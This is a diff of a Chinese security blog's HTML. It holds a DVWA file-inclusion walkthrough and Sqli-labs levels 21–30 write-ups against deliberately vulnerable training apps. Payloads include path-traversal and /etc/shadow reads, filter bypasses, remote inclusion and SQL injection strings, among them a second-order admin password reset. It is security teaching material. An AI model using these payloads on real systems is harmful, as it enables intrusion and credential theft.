 <h2 id="Security-Level-—-Low"><a href="#Security-Level-—-Low" class="headerlink" title="Security Level — Low"></a>Security Level — Low</h2><p>核心代码</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// The page we wish to display</span></span><br><span class="line">$file = $_GET[ <span class="string">'page'</span> ];</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<p>从代码中可以看出来，对接受的<code>page</code>参数没有经过任何的处理，我们现在分别点击初始页面中的<code>file1.php、file2.php、file3.php</code>，发现<code>URL</code>中改变的只有page参数</p>
+<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/DVWA/4-4.png" alt="4-4"></p>
+<p>既然page没有任何限制，现在就能读取其他文件，操作开始</p>
+<p>1.本地文件包含</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.0.105/dvwa/vulnerabilities/fi/?page=/etc/shadow</span><br></pre></td></tr></table></figure>
+<p>没有找到文件，那就说明这台服务器并不是Linux服务器</p>
+<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/DVWA/4-5.png" alt="4-5"></p>
+<p>在服务器根目录下写一个test.php</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">phpinfo()</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<p>使用<code>绝对路径</code>访问test.php，访问成功</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.0.105/dvwa/vulnerabilities/fi/?page=C:\phpstudy\www\test.php</span><br></pre></td></tr></table></figure>
+<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/DVWA/4-6.png" alt="4-6"></p>
+<p>使用<code>相对路径</code>访问test.php，访问成功</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.0.105/dvwa/vulnerabilities/fi/?page=../../../../../../phpstudy/www/test.php</span><br></pre></td></tr></table></figure>
+<p>Ps：多个<code>../</code>是为了能够保证到达当下盘的根目录；斜杠和反斜杠都可以</p>
+<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/DVWA/4-7.png" alt="4-7"></p>
+<p>2.远程文件包含</p>
+<p>当服务器的php配置中，选项<code>allow_url_fopen</code>与<code>allow_url_include</code>为开启状态时，服务器会允许包含远程服务器上的文件，如果对文件来源没有检查的话，就容易导致任意远程代码执行</p>
+<p>直接试一下访问百度，直接访问成功</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.0.105/dvwa/vulnerabilities/fi/?page=http://www.baidu.com</span><br></pre></td></tr></table></figure>
+<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/DVWA/4-8.png" alt="4-8"></p>
 <h2 id="Security-Level-—-Medium"><a href="#Security-Level-—-Medium" class="headerlink" title="Security Level — Medium"></a>Security Level — Medium</h2><p>核心代码</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// The page we wish to display</span></span><br><span class="line">$file = $_GET[ <span class="string">'page'</span> ];</span><br><span class="line"></span><br><span class="line"><span class="comment">// Input validation</span></span><br><span class="line">$file = str_replace( <span class="keyword">array</span>( <span class="string">"http://"</span>, <span class="string">"https://"</span> ), <span class="string">""</span>, $file );</span><br><span class="line">$file = str_replace( <span class="keyword">array</span>( <span class="string">"../"</span>, <span class="string">"..\""</span> ), <span class="string">""</span>, $file );</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<p>从代码中可以看出来，利用<code>str_replace()</code>函数对<code>http://、https://、../、..\</code>这4个重要的关键字符进行了过滤，但是绕过规则也比较简单，直接<code>双写</code>或者<code>大小写</code>就可以解决</p>
+<p>虽然<code>../</code>无法绕过，但影响也不大，因为绝对路径还可以使用，试一下双写绕过，可以成功</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.0.105/dvwa/vulnerabilities/fi/?page=hthttp://tp://www.baidu.com</span><br></pre></td></tr></table></figure>
+<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/DVWA/4-9.png" alt="4-9"></p>
+<p>试一下大小写绕过，也可以成功</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.0.105/dvwa/vulnerabilities/fi/?page=HtTp://www.baidu.com</span><br></pre></td></tr></table></figure>
+<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/DVWA/4-10.png" alt="4-10"></p>
 <h2 id="Security-Level-—-High"><a href="#Security-Level-—-High" class="headerlink" title="Security Level — High"></a>Security Level — High</h2><p>核心代码</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// The page we wish to display</span></span><br><span class="line">$file = $_GET[ <span class="string">'page'</span> ];</span><br><span class="line"></span><br><span class="line"><span class="comment">// Input validation</span></span><br><span class="line"><span class="keyword">if</span>( !fnmatch( <span class="string">"file*"</span>, $file ) &amp;&amp; $file != <span class="string">"include.php"</span> ) &#123;</span><br><span class="line">	<span class="comment">// This isn't the page we want!</span></span><br><span class="line">	<span class="keyword">echo</span> <span class="string">"ERROR: File not found!"</span>;</span><br><span class="line">	<span class="keyword">exit</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<p>源码中可以看出来通过<code>fnmatch()</code>函数限制了输入的参数必须以<code>file</code>开头，但是我们还是可以绕过</p>
+<p>1.file协议</p>
+<p>因为使用浏览器打开一个本地文件时，使用的是file协议，刚好以file开头</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">file:///C:/phpstudy/WWW/file.txt</span><br></pre></td></tr></table></figure>
+<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/DVWA/4-11.png" alt="4-11"></p>
+<p>现在构造URL</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.0.105/dvwa/vulnerabilities/fi/?page=file:///C:/phpstudy/www/test.php</span><br></pre></td></tr></table></figure>
+<p>成功访问</p>
+<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/DVWA/4-12.png" alt="4-12"></p>
 <h2 id="Security-Level-—-Impossible"><a href="#Security-Level-—-Impossible" class="headerlink" title="Security Level — Impossible"></a>Security Level — Impossible</h2><p>核心代码</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// The page we wish to display</span></span><br><span class="line">$file = $_GET[ <span class="string">'page'</span> ];</span><br><span class="line"></span><br><span class="line"><span class="comment">// Only allow include.php or file&#123;1..3&#125;.php</span></span><br><span class="line"><span class="keyword">if</span>( $file != <span class="string">"include.php"</span> &amp;&amp; $file != <span class="string">"file1.php"</span> &amp;&amp; $file != <span class="string">"file2.php"</span> &amp;&amp; $file != <span class="string">"file3.php"</span> ) &#123;</span><br><span class="line">	<span class="comment">// This isn't the page we want!</span></span><br><span class="line">	<span class="keyword">echo</span> <span class="string">"ERROR: File not found!"</span>;</span><br><span class="line">	<span class="keyword">exit</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<p>Impossible难度只允许<code>include.php</code>或者<code>file{1..3}.php</code>，虽然不灵活，但是却彻底杜绝文件包含漏洞</p>
+<hr>
+<p>参考文章：</p>
+<p><a href="https://www.freebuf.com/articles/web/119150.html" target="_blank" rel="noopener">https://www.freebuf.com/articles/web/119150.html</a></p>
 
       
 
@@ -1210,165 +1344,6 @@
 
 
   
-    <article id="post-Sqli-labs 第21-30关" class="article article-type-post  article-index" itemscope itemprop="blogPost">
-  <div class="article-inner">
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/Knlvre.github-io/2019/01/31/Sqli-labs 第21-30关/">Sqli-labs(第21-30关)</a>
-    </h1>
-  
-
-        
-        <a href="/Knlvre.github-io/2019/01/31/Sqli-labs 第21-30关/" class="archive-article-date">
-  	<time datetime="2019-01-30T16:00:00.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2019-01-31</time>
-</a>
-        
-      </header>
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <p>前一部分链接：<a href="https://knlvre.github.io/Knlvre.github-io/2019/01/30/Sqli-labs%20%E7%AC%AC11-20%E5%85%B3/">第11-20关Write-up</a></p>
-<h2 id="Less-21"><a href="#Less-21" class="headerlink" title="Less-21"></a>Less-21</h2><p>与<code>Less-20</code>类似，只是对变量<code>Cookiee</code>进行了<code>Base64</code>加密，并且使用单引号和括号进行包裹</p>
-<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/Sqli-labs/21-30/1-1.png" alt="1-1"></p>
-<p>将<code>payload</code>进行加密</p>
-<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/Sqli-labs/21-30/1-2.png" alt="1-2"></p>
-<p>加入到 <code>Cookie</code>中，注入成功</p>
-<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/Sqli-labs/21-30/1-3.png" alt="1-3"></p>
-<h2 id="Less-22"><a href="#Less-22" class="headerlink" title="Less-22"></a>Less-22</h2><p>与前面关卡类似，只是对<code>$cookee</code>包括采用了<code>双引号</code></p>
-<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/Sqli-labs/21-30/2-1.png" alt="2-1"></p>
-<p><code>Base64</code>加密一下<code>payload</code>：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&quot; and extractvalue(1,concat(0x7e,(select group_concat(username,password) from users where id=2),0x7e))#</span><br><span class="line"></span><br><span class="line">加密后：</span><br><span class="line">IiBhbmQgZXh0cmFjdHZhbHVlKDEsY29uY2F0KDB4N2UsKHNlbGVjdCBncm91cF9jb25jYXQodXNlcm5hbWUscGFzc3dvcmQpIGZyb20gdXNlcnMgd2hlcmUgaWQ9MiksMHg3ZSkpIw</span><br></pre></td></tr></table></figure>
-<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/Sqli-labs/21-30/2-2.png" alt="2-2"></p>
-<h2 id="Less-23"><a href="#Less-23" class="headerlink" title="Less-23"></a>Less-23</h2><p>查看源代码，本关将注释符：<code>#、--</code>进行了过滤，查询语句是通过<code>单引号</code>来包裹<code>$id</code>的</p>
-<p>所以只需要将结尾的单引号处理掉就好了</p>
-<p>爆表名：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=-1&apos; union select 1,（select group_concat(table_name) from information_schema.tables where table_schema=database()）,3 and &apos;1&apos;=&apos;1</span><br></pre></td></tr></table></figure>
-<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/Sqli-labs/21-30/3-1.png" alt="3-1"></p>
-<p>其他的语句自行构造，不再赘述</p>
-<h2 id="Less-24"><a href="#Less-24" class="headerlink" title="Less-24"></a>Less-24</h2><p>本关考察<code>二次排序注入（二次注入、存储型注入）</code></p>
-<p>查看本关源代码</p>
-<p><code>创建用户</code>时的语句为：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">insert into users ( username, password) values(\&quot;$username\&quot;, \&quot;$pass\&quot;)</span><br></pre></td></tr></table></figure>
-<p><code>修改密码</code>时的语句为：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">UPDATE users SET PASSWORD=&apos;$pass&apos; where username=&apos;$username&apos; and password=&apos;$curr_pass&apos;</span><br></pre></td></tr></table></figure>
-<p>结题思路：</p>
-<p>创建一个用户，名为<code>admin&#39;#</code>，密码随意，数据库执行以下语句：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">insert into users ( username, password) values(\&quot;admin&apos;#\&quot;, \&quot;666\&quot;)</span><br></pre></td></tr></table></figure>
-<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/Sqli-labs/21-30/4-1.png" alt="4-1"></p>
-<p>返回首页，<code>登陆</code>这个新注册的<code>admin&#39;#</code>用户</p>
-<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/Sqli-labs/21-30/4-2.png" alt="4-2"></p>
-<p>登陆成功，可以直接<code>修改密码</code>，数据库执行了以下语句：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">UPDATE users SET PASSWORD=&apos;$pass&apos; where username=&apos;admin&apos;# and password=&apos;$curr_pass&apos;</span><br></pre></td></tr></table></figure>
-<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/Sqli-labs/21-30/4-3.png" alt="4-3"></p>
-<p>此时<code>admin</code>用户的密码已经改成我们修改的那个密码了，可以直接登录</p>
-<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/Sqli-labs/21-30/4-4.png" alt="4-4"></p>
-<h2 id="Less-25"><a href="#Less-25" class="headerlink" title="Less-25"></a>Less-25</h2><p><code>单引号包裹</code>、题目提示我们<code>or</code>和<code>and</code>被过滤掉了</p>
-<p>但是影响并不是很大，因为可以用<code>双写</code>绕过</p>
-<p><code>information</code>里面包含<code>or</code>，记得双写绕过就可以了：<code>infoorrmation</code></p>
-<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/Sqli-labs/21-30/5-1.png" alt="5-1"></p>
-<p>其他的不再赘述</p>
-<h2 id="Less-25a"><a href="#Less-25a" class="headerlink" title="Less-25a"></a>Less-25a</h2><p><code>没有用符号包裹</code>、同样提示我们<code>or</code>和<code>and</code>被过滤掉了</p>
-<p>其他和Less-25一样</p>
-<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/Sqli-labs/21-30/5-2.png" alt="5-2"></p>
-<h2 id="Less-26"><a href="#Less-26" class="headerlink" title="Less-26"></a>Less-26</h2><p>过滤规则，过滤了：<code>or、and、/、*、--、#、\s空格、/、\\</code></p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">blacklist</span><span class="params">($id)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	$id= preg_replace(<span class="string">'/or/i'</span>,<span class="string">""</span>, $id);			<span class="comment">//strip out OR (non case sensitive)</span></span><br><span class="line">	$id= preg_replace(<span class="string">'/and/i'</span>,<span class="string">""</span>, $id);		<span class="comment">//Strip out AND (non case sensitive)</span></span><br><span class="line">	$id= preg_replace(<span class="string">'/[\/\*]/'</span>,<span class="string">""</span>, $id);		<span class="comment">//strip out /*</span></span><br><span class="line">	$id= preg_replace(<span class="string">'/[--]/'</span>,<span class="string">""</span>, $id);		<span class="comment">//Strip out --</span></span><br><span class="line">	$id= preg_replace(<span class="string">'/[#]/'</span>,<span class="string">""</span>, $id);			<span class="comment">//Strip out #</span></span><br><span class="line">	$id= preg_replace(<span class="string">'/[\s]/'</span>,<span class="string">""</span>, $id);		<span class="comment">//Strip out spaces</span></span><br><span class="line">	$id= preg_replace(<span class="string">'/[\/\\\\]/'</span>,<span class="string">""</span>, $id);		<span class="comment">//Strip out slashes</span></span><br><span class="line">	<span class="keyword">return</span> $id;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<p>（1）<code>or</code>和<code>and</code>的绕过</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">or：用||代替</span><br><span class="line">and:用&amp;&amp;代替</span><br></pre></td></tr></table></figure>
-<p>（2）<code>空格</code>的绕过</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">%09：tab键（水平）</span><br><span class="line">%0b：tab键（垂直）</span><br><span class="line">%0a：新建一行</span><br><span class="line">%0c：新的一页</span><br><span class="line">%0d：return功能</span><br><span class="line">%a0：空格</span><br></pre></td></tr></table></figure>
-<p>由于<code>井号#</code>和<code>--</code>被过滤的，只能用<code>||&#39;1</code>处理掉末尾的单引号</p>
-<p>不过我的环境好像不能使用上面的几种变换绕过空格，但是从27关开始又可以</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=0&apos;%0aunion%0aselect%0a1,2,3%0a||%0a&apos;1</span><br></pre></td></tr></table></figure>
-<h2 id="Less-26a"><a href="#Less-26a" class="headerlink" title="Less-26a"></a>Less-26a</h2><p>本关与前一关的区别在于，关闭了mysql报错</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$sql=<span class="string">"SELECT * FROM users WHERE id=('$id') LIMIT 0,1"</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">//print_r(mysql_error());</span></span><br></pre></td></tr></table></figure>
-<p>其他与前一关保持一致</p>
-<h2 id="Less-27"><a href="#Less-27" class="headerlink" title="Less-27"></a>Less-27</h2><p>过滤规则：</p>
-<p>这里解释一下<code>/m</code>和<code>/s</code>的用法：</p>
-<p>/m：当设定了此修正符，行起始和行结束除了匹配整个字符串开头和结束外，还分别匹配其中的换行符的之后和之前。</p>
-<p>/s：如果设定了此修正符，模式中的圆点元字符（.）匹配所有的字符，包括换行符。没有此设定的话，则不包括换行符。</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">blacklist</span><span class="params">($id)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">$id= preg_replace(<span class="string">'/[\/\*]/'</span>,<span class="string">""</span>, $id);		<span class="comment">//strip out /*</span></span><br><span class="line">$id= preg_replace(<span class="string">'/[--]/'</span>,<span class="string">""</span>, $id);		<span class="comment">//Strip out --.</span></span><br><span class="line">$id= preg_replace(<span class="string">'/[#]/'</span>,<span class="string">""</span>, $id);			<span class="comment">//Strip out #.</span></span><br><span class="line">$id= preg_replace(<span class="string">'/[ +]/'</span>,<span class="string">""</span>, $id);	    <span class="comment">//Strip out spaces.</span></span><br><span class="line">$id= preg_replace(<span class="string">'/select/m'</span>,<span class="string">""</span>, $id);	    <span class="comment">//Strip out spaces.</span></span><br><span class="line">$id= preg_replace(<span class="string">'/[ +]/'</span>,<span class="string">""</span>, $id);	    <span class="comment">//Strip out spaces.</span></span><br><span class="line">$id= preg_replace(<span class="string">'/union/s'</span>,<span class="string">""</span>, $id);	    <span class="comment">//Strip out union</span></span><br><span class="line">$id= preg_replace(<span class="string">'/select/s'</span>,<span class="string">""</span>, $id);	    <span class="comment">//Strip out select</span></span><br><span class="line">$id= preg_replace(<span class="string">'/UNION/s'</span>,<span class="string">""</span>, $id);	    <span class="comment">//Strip out UNION</span></span><br><span class="line">$id= preg_replace(<span class="string">'/SELECT/s'</span>,<span class="string">""</span>, $id);	    <span class="comment">//Strip out SELECT</span></span><br><span class="line">$id= preg_replace(<span class="string">'/Union/s'</span>,<span class="string">""</span>, $id);	    <span class="comment">//Strip out Union</span></span><br><span class="line">$id= preg_replace(<span class="string">'/Select/s'</span>,<span class="string">""</span>, $id);	    <span class="comment">//Strip out Select</span></span><br><span class="line"><span class="keyword">return</span> $id;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<p>过滤<code>union</code>和<code>select</code>前面的关卡已经用过了，我们这里同理，用双写就可以绕过</p>
-<p>值得注意的是这里的<code>id</code>不能再赋值为负数，因为出来的结果中-1会等于1，-2会等于2，以此类推，所以此处使用0就可以</p>
-<p>payload：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=0&apos;%0auniunionon%0aSeLeCt%0b1,2,3%0a||&apos;1</span><br></pre></td></tr></table></figure>
-<h2 id="Less-27a"><a href="#Less-27a" class="headerlink" title="Less-27a"></a>Less-27a</h2><p>本关与前一关的区别在于，关闭了mysql报错</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$sql=<span class="string">"SELECT * FROM users WHERE id=$id LIMIT 0,1"</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">//print_r(mysql_error());</span></span><br></pre></td></tr></table></figure>
-<p>其他与前一关保持一致</p>
-<p>payload：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=0&quot;%0aunion%0aSeLect%0a1,2,3%0a||%0a&quot;1</span><br></pre></td></tr></table></figure>
-<h2 id="Less-28"><a href="#Less-28" class="headerlink" title="Less-28"></a>Less-28</h2><p>过滤规则：</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">blacklist</span><span class="params">($id)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">$id= preg_replace(<span class="string">'/[\/\*]/'</span>,<span class="string">""</span>, $id);				<span class="comment">//strip out /*</span></span><br><span class="line">$id= preg_replace(<span class="string">'/[--]/'</span>,<span class="string">""</span>, $id);				<span class="comment">//Strip out --.</span></span><br><span class="line">$id= preg_replace(<span class="string">'/[#]/'</span>,<span class="string">""</span>, $id);					<span class="comment">//Strip out #.</span></span><br><span class="line">$id= preg_replace(<span class="string">'/[ +]/'</span>,<span class="string">""</span>, $id);	    		<span class="comment">//Strip out spaces.</span></span><br><span class="line"><span class="comment">//$id= preg_replace('/select/m',"", $id);	   		 //Strip out spaces.</span></span><br><span class="line">$id= preg_replace(<span class="string">'/[ +]/'</span>,<span class="string">""</span>, $id);	    		<span class="comment">//Strip out spaces.</span></span><br><span class="line">$id= preg_replace(<span class="string">'/union\s+select/i'</span>,<span class="string">""</span>, $id);	    <span class="comment">//Strip out UNION &amp; SELECT.</span></span><br><span class="line"><span class="keyword">return</span> $id;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<p>本关不单独过滤<code>union</code>或<code>select</code>单词，而是过滤<code>union select</code>这个整体</p>
-<p>解决办法就是同样的道理，双写就行</p>
-<p>payload：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=0&apos;)%0aunion%0aunion%0aselectselect%0a1,2,3%0a||%0a(&apos;1</span><br></pre></td></tr></table></figure>
-<h2 id="Less-28a"><a href="#Less-28a" class="headerlink" title="Less-28a"></a>Less-28a</h2><p>过滤规则：</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">blacklist</span><span class="params">($id)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="comment">//$id= preg_replace('/[\/\*]/',"", $id);				//strip out /*</span></span><br><span class="line"><span class="comment">//$id= preg_replace('/[--]/',"", $id);				//Strip out --.</span></span><br><span class="line"><span class="comment">//$id= preg_replace('/[#]/',"", $id);					//Strip out #.</span></span><br><span class="line"><span class="comment">//$id= preg_replace('/[ +]/',"", $id);	    		//Strip out spaces.</span></span><br><span class="line"><span class="comment">//$id= preg_replace('/select/m',"", $id);	   		 	//Strip out spaces.</span></span><br><span class="line"><span class="comment">//$id= preg_replace('/[ +]/',"", $id);	    		//Strip out spaces.</span></span><br><span class="line">$id= preg_replace(<span class="string">'/union\s+select/i'</span>,<span class="string">""</span>, $id);	    <span class="comment">//Strip out spaces.</span></span><br><span class="line"><span class="keyword">return</span> $id;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<p>这里注意到其他规则已经注释掉，只过滤<code>union select</code>这个整体</p>
-<p>过滤规则更少更简单了，前一关的payload可以继续使用，当然也可以使用更简单的</p>
-<p>payload：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=0&apos;) union union selectselect 1,2,3--+</span><br></pre></td></tr></table></figure>
-<h2 id="Less-29至31"><a href="#Less-29至31" class="headerlink" title="Less-29至31"></a>Less-29至31</h2><p>这一部分训练的是HPP（HTTP Parameter Pollution），俗称HTTP参数污染。</p>
-<p>开始看这题并没有发现index.php有WAF，后来发现原来是index.jsp用了WAF，关键代码如下。</p>
-<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&lt;%</span><br><span class="line">    String id = request.getParameter(<span class="string">"id"</span>);</span><br><span class="line">    String qs = request.getQueryString();</span><br><span class="line">    String rex = <span class="string">"^\\d+$"</span>;</span><br><span class="line">    Boolean match=id.matches(rex);</span><br><span class="line">    <span class="keyword">if</span>(match == <span class="keyword">true</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        URL sqli_labs = <span class="keyword">new</span> URL(<span class="string">"http://localhost/sqli-labs/Less-29/index.php?"</span>+ qs);</span><br><span class="line">        URLConnection sqli_labs_connection = sqli_labs.openConnection();</span><br><span class="line">    &#125;</span><br><span class="line">%&gt;</span><br></pre></td></tr></table></figure>
